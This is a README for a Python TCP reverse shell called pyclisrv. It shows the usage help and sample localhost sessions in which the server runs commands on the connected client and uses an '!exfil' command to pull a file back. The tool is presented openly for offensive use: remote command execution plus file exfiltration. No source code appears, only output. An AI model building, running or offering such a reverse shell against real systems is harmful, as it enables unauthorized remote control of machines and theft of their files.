# pyclisrv
usage: tcpsrv.py [-h] [-v] ip port

positional arguments:
  ip             The IP address to listen on.
  port           The TCP port to listen on.

optional arguments:
  -h, --help     show this help message and exit
  -v, --verbose  Increase verbosity of output.





root@w530-gnome# ./tcpsrv.py localhost 8080 -v


    TCP Reverse Shell - Server
    [Version 0.0.102804] 
    @a7kemc73


[-] Listening for connection on: localhost:8080
[+] Connection received from: 127.0.0.1:55866
127.0.0.1>> ls -al
total 32
drwxrwx--- 1 root vboxsf  4096 Oct 28 19:52 .
drwxrwx--- 1 root vboxsf     0 Oct 26 22:13 ..
drwxrwx--- 1 root vboxsf  4096 Oct 28 19:53 .git
drwxrwx--- 1 root vboxsf  4096 Oct 28 19:54 lib
-rwxrwx--- 1 root vboxsf 15028 Oct 28 18:14 README.md
-rwxrwx--- 1 root vboxsf  1934 Oct 28 19:51 tcpcli.py
-rwxrwx--- 1 root vboxsf  2268 Oct 28 19:44 tcpsrv.py

127.0.0.1>> !exfil README.md
[-] Writing exfil file README.md.exfil !!!!!!!!!!!!!!!
[+] Exfil complete
127.0.0.1>> ls -al
total 47
drwxrwx--- 1 root vboxsf  4096 Oct 28 19:55 .
drwxrwx--- 1 root vboxsf     0 Oct 26 22:13 ..
drwxrwx--- 1 root vboxsf  4096 Oct 28 19:53 .git
drwxrwx--- 1 root vboxsf  4096 Oct 28 19:54 lib
-rwxrwx--- 1 root vboxsf 15028 Oct 28 18:14 README.md
-rwxrwx--- 1 root vboxsf 15028 Oct 28 19:55 README.md.exfil
-rwxrwx--- 1 root vboxsf  1934 Oct 28 19:51 tcpcli.py
-rwxrwx--- 1 root vboxsf  2268 Oct 28 19:44 tcpsrv.py

127.0.0.1>> rm README.md.exfil

127.0.0.1>> ls -al
total 32
drwxrwx--- 1 root vboxsf  4096 Oct 28 19:55 .
drwxrwx--- 1 root vboxsf     0 Oct 26 22:13 ..
drwxrwx--- 1 root vboxsf  4096 Oct 28 19:53 .git
drwxrwx--- 1 root vboxsf  4096 Oct 28 19:54 lib
-rwxrwx--- 1 root vboxsf 15028 Oct 28 18:14 README.md
-rwxrwx--- 1 root vboxsf  1934 Oct 28 19:51 tcpcli.py
-rwxrwx--- 1 root vboxsf  2268 Oct 28 19:44 tcpsrv.py

127.0.0.1>> !quit
root@w530-gnome# 





root@w530-gnome# ./tcpcli.py localhost 8080 -v


    TCP Reverse Shell - Client
    [Version 0.0.102804] 
    @a7kemc73


[-] Trying connection to: localhost:8080
[+] Connected to: localhost:8080
[-] Transferring file README.md !!!!!!!!!!!!!!!!
[+] Transfer Complete.
root@w530-gnome# 
